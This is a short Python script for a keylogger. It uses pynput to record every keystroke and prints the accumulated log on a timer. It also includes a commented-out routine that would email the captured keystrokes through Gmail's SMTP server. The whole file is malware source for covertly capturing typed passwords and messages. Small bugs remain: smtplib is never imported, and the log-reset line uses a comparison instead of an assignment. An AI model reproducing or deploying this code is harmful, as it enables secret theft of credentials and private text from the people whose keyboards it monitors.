#!/usr/bin/env python3
import pynput.keyboard
import threading

class KeyLogger:
    def __init__(self,time_interval=5,email=' ',password=' '): # by default runs report every 5 seconds
        self.log = "Keylogger Started.."
        self.time_interval = time_interval
        self.email = email
        self.password = password

    def append_log(self,msg):
        self.log = self.log + msg


    def process_key_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " +str(key) + " "
        self.append_log(current_key)                

    def report(self):
        #self.send_mail(self.email,self.password,"\n\n" +self.log)
        print(self.log)
        self.log == ""
        timer = threading.Timer(self.time_interval,self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(self.process_key_press)  
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com",587) # google server,port
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message) # from my email to my email
        server.quit()    
my_keylogger = KeyLogger(10,'',' ')
my_keylogger.start()
###